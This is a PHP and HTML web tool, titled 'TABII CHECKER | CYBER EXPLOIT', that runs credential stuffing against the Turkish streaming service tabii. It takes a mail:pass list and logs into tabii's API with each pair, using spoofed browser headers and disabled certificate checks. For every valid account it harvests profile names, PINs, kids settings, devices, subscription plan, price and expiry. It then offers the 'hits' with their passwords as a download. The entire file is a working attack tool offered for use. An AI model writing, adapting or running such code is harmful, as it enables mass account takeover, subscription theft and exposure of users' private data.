<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    error_reporting(0);
    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    // LR PARSE (String Parçalama)
    function parse_lr($source, $left, $right) {
        if (empty($source)) return 'Bilinmiyor';
        $str = explode($left, $source);
        if (isset($str[1])) {
            $str = explode($right, $str[1]);
            return trim($str[0]);
        }
        return 'Bilinmiyor';
    }

    function tabii_curl($url, $method = 'GET', $post = null, $extraHeaders = []) {
        $ch = curl_init($url);
        $headers = [
            "host: eu1.tabii.com",
            "accept: application/json, text/plain, */*",
            "accept-language: tr",
            "app-version: 1.5.8",
            "device-brand: Windows",
            "device-connection-type: Unknown",
            "device-id: 1766952699100_163144",
            "device-language: tr",
            "device-model: Windows NT 10.0 - Opera",
            "device-name: Windows NT 10.0 - Opera",
            "device-network: 4g",
            "device-orientation: Landscape",
            "device-os-name: Windows",
            "device-os-version: NT 10.0",
            "device-resolution: 1920x1080",
            "device-timezone: Europe/Istanbul",
            "device-type: WEBDesktop",
            "origin: https://www.tabii.com",
            "platform: Web",
            "priority: u=1, i",
            "referer: https://www.tabii.com/",
            "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Opera GX\";v=\"124\"",
            "sec-ch-ua-mobile: ?0",
            "sec-ch-ua-platform: \"Windows\"",
            "sec-fetch-dest: empty",
            "sec-fetch-mode: cors",
            "sec-fetch-site: same-site",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 OPR/124.0.0.0 (Edition Yx GX TR 2)",
            "x-country-code: TR"
        ];
        if ($post) $headers[] = "Content-Type: application/json;charset=UTF-8";
        if (!empty($extraHeaders)) $headers = array_merge($headers, $extraHeaders);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        if ($post) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }


    $yahhhhhsikicemşimdiyaahhhhhh = json_encode(["email" => $user, "password" => $pass, "remember" => false]);
    $lRes = tabii_curl("https://eu1.tabii.com/apigateway/auth/v2/login", "POST", $yahhhhhsikicemşimdiyaahhhhhh);
    $token = parse_lr($lRes, '{"accessToken":"', '",');

    if ($token !== 'Bilinmiyor') {
        $auth = ["authorization: Bearer $token"];


        $pRes = tabii_curl("https://eu1.tabii.com/apigateway/profiles/v2/", "GET", null, $auth);
        $pCount = parse_lr($pRes, '{"count":', ',"');
        $pName = parse_lr($pRes, '"name":"', '",');
        $pPin = parse_lr($pRes, '"pin":', ',"');
        $pWifi = parse_lr($pRes, '{"onlyWifi":', ',"');
        $pMaturity = parse_lr($pRes, '"maturityLevel":"', '",');
        $pKids = parse_lr($pRes, '"kids":', ',"');
        $pQuality = parse_lr($pRes, '"quality":"', '"}');

        $dRes = tabii_curl("https://eu1.tabii.com/apigateway/devices/v1/", "GET", null, $auth);
        $dCount = parse_lr($dRes, '{"count":', ',"');
        $dModel = parse_lr($dRes, '"model":"', '",');
        $dNet = parse_lr($dRes, '"network":"', '",');
        $dRoot = parse_lr($dRes, '"rootStatus":"', '",');

        $sRes = tabii_curl("https://eu1.tabii.com/apigateway/subscriptions/v1/products/", "GET", null, $auth);
        $sub1 = parse_lr($sRes, '"tabii0000","title":"', '",');
        $sub2 = parse_lr($sRes, '"tabii0002","title":"', '"}]}');
        
        $mainPlan = "Ücretsiz";
        if (strpos($sRes, 'tabii0000') !== false) $mainPlan = "Premium (Aylık)";
        if (strpos($sRes, 'tabii0002') !== false) $mainPlan = "Premium (Yıllık)";

        $mRes = tabii_curl("https://eu1.tabii.com/apigateway/auth/v2/me", "GET", null, $auth);
        
        $price = parse_lr($mRes, '"planPrice":', ','); 
        if($price == 'Bilinmiyor') $price = "0.00";

        $rawDate = parse_lr($mRes, '"expireDate":"', '"');
        $expire = "Süresiz";
        if($rawDate !== 'Bilinmiyor') {
            $expire = date("d.m.Y H:i", strtotime($rawDate));
        }

        echo json_encode([
            'status' => 'success',
            'user' => $user, 'pass' => $pass, 'plan' => $mainPlan,
            'p_info' => "Profil: $pName (Toplam: $pCount) | Pin: $pPin | Kids: $pKids | Kalite: $pQuality | Sınır: $pMaturity | Wifi: $pWifi",
            'd_info' => "Cihaz: $dCount | Model: $dModel | Ağ: $dNet | Root: $dRoot",
            'sub_info' => "1. Profil Abonelik: $sub1 | 2. Profil Abonelik: $sub2 | Fiyat: $price TL | Bitiş: $expire"
        ]);
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>TABII CHECKER | CYBER EXPLOIT</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #030508; color: #e2e8f0; font-family: 'Inter', sans-serif; }
        .neon-blue { box-shadow: 0 0 15px rgba(59, 130, 246, 0.15); border: 1px solid rgba(59, 130, 246, 0.3); }
        .neon-green { box-shadow: 0 0 15px rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); }
        .neon-red { box-shadow: 0 0 15px rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); }
        .main-card { background: rgba(15, 18, 26, 0.9); backdrop-filter: blur(10px); border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); }
        .input-area { background: #0a0c12; border: 1px solid #1f2937; border-radius: 12px; color: #60a5fa; font-family: 'Consolas', monospace; outline: none; }
        .hit-box { background: linear-gradient(145deg, #0f121a, #0a0c12); border-left: 4px solid #10b981; border-radius: 12px; }
        .animate-fade { animation: fadeInUp 0.5s ease forwards; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="p-4 md:p-8">

    <div class="max-w-[1500px] mx-auto flex justify-between items-center mb-8 animate-fade">
        <div class="flex items-center gap-3">
            <div class="w-11 h-11 bg-green-600 rounded-lg flex items-center justify-center shadow-lg shadow-green-600/30">
                <i class="fas fa-bolt text-white text-xl"></i>
            </div>
            <h1 class="text-2xl font-black tracking-tighter italic" style="font-family: 'Syncopate', sans-serif;">
                TABII<span class="text-green-500">EXPLOIT</span><span class="text-gray-600 text-xs ml-2">v2.1</span>
            </h1>
        </div>
        <a href="index.php" class="bg-white/5 hover:bg-red-500 border border-white/10 px-5 py-2.5 rounded-xl text-xs font-black transition-all uppercase tracking-widest">
            <i class="fas fa-power-off mr-2"></i> Çıkış
        </a>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 md:grid-cols-3 gap-5 mb-8 animate-fade">
        <div class="main-card p-6 neon-blue">
            <span class="text-gray-500 text-[10px] font-black uppercase tracking-widest block mb-1">Kalan İşlem</span>
            <div class="text-4xl font-black" id="kalan_val">0</div>
        </div>
        <div class="main-card p-6 neon-green">
            <span class="text-green-500 text-[10px] font-black uppercase tracking-widest block mb-1">Hit</span>
            <div class="text-4xl font-black text-green-500" id="hit_count">0</div>
        </div>
        <div class="main-card p-6 neon-red">
            <span class="text-red-500 text-[10px] font-black uppercase tracking-widest block mb-1">Fail</span>
            <div class="text-4xl font-black text-red-500" id="fail_count">0</div>
        </div>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div class="lg:col-span-4 space-y-5 animate-fade">
            <div class="main-card p-6">
                <div class="flex items-center gap-3 mb-4 border-b border-white/5 pb-3">
                    <i class="fas fa-list-ul text-blue-500"></i>
                    <h2 class="text-lg font-black uppercase tracking-tighter">Hesap Listesi</h2>
                </div>
                <textarea id="accs" class="input-area h-[300px] p-4 text-xs w-full" placeholder="mail:pass"></textarea>
                <button id="btn" onclick="startCheck()" class="w-full mt-5 py-4 bg-blue-600 rounded-xl text-white font-black uppercase tracking-widest hover:bg-blue-700 transition-all text-sm">
                    Sistemi Başlat
                </button>
            </div>
        </div>

        <div class="lg:col-span-8 animate-fade">
            <div class="flex justify-between items-end mb-4">
                <h2 class="text-xl font-black uppercase tracking-tighter">Capture Log</h2>
                <button onclick="downloadHits()" class="bg-green-600 px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest flex items-center gap-2">
                    <i class="fas fa-download"></i> İndir
                </button>
            </div>
            <div class="main-card p-6 h-[600px] overflow-y-auto space-y-4" id="hitLog">
                <div class="flex flex-col items-center justify-center h-full opacity-10 italic">
                    <i class="fas fa-terminal text-7xl mb-4"></i>
                    <p class="font-black uppercase tracking-[0.3em]">Data bekleniyor...</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        let running = false;
        let hits = 0; let fails = 0;
        let hitResults = [];

        async function startCheck() {
            const list = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));
            if(!list.length) return alert("Liste boş!");

            running = true;
            const btn = document.getElementById('btn');
            btn.innerText = "DURDUR";
            btn.classList.replace('bg-blue-600', 'bg-red-600');
            document.getElementById('kalan_val').innerText = list.length;

            for(let line of list) {
                if(!running) break;
                const parts = line.trim().split(':');
                if(parts.length < 2) continue;
                
                try {
                    const fd = new FormData(); 
                    fd.append('user', parts[0]); 
                    fd.append('pass', parts[1]);
                    const resp = await fetch('?action=check', { method: 'POST', body: fd });
                    const res = await resp.json();

                    if(res.status === 'success') {
                        hits++;
                        document.getElementById('hit_count').innerText = hits;
                        hitResults.push(`${res.user}:${res.pass} | ${res.plan} | ${res.p_info} | ${res.d_info} | ${res.sub_info}`);
                        addHit(res);
                    } else {
                        fails++;
                        document.getElementById('fail_count').innerText = fails;
                    }
                } catch(e) { 
                    fails++;
                    document.getElementById('fail_count').innerText = fails;
                }
                document.getElementById('kalan_val').innerText = parseInt(document.getElementById('kalan_val').innerText) - 1;
            }
            running = false;
            btn.innerText = "SİSTEMİ BAŞLAT";
            btn.classList.replace('bg-red-600', 'bg-blue-600');
        }

        function addHit(res) {
            const log = document.getElementById('hitLog');
            if(hits === 1) log.innerHTML = '';
            
            const div = document.createElement('div');
            div.className = 'hit-box p-4 animate-fade mb-4';
            div.innerHTML = `
                <div class="flex justify-between items-center border-b border-white/5 pb-2 mb-2">
                    <div class="text-xs"><span class="text-blue-400 font-bold">${res.user}</span>:<span class="opacity-60">${res.pass}</span></div>
                    <div class="text-sm font-black text-green-500 uppercase">${res.plan}</div>
                </div>
                <div class="grid grid-cols-1 gap-1 text-[10px] font-mono">
                    <div class="text-blue-300"><i class="fas fa-user-circle mr-1"></i> ${res.p_info}</div>
                    <div class="text-orange-300"><i class="fas fa-mobile-alt mr-1"></i> ${res.d_info}</div>
                    <div class="text-green-200"><i class="fas fa-credit-card mr-1"></i> ${res.sub_info}</div>
                </div>
            `;
            log.prepend(div);
        }

        function downloadHits() {
            if (!hitResults.length) return;
            const blob = new Blob([hitResults.join('\n')], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `TABII_HITS.txt`;
            a.click();
        }
    </script>
</body>
</html>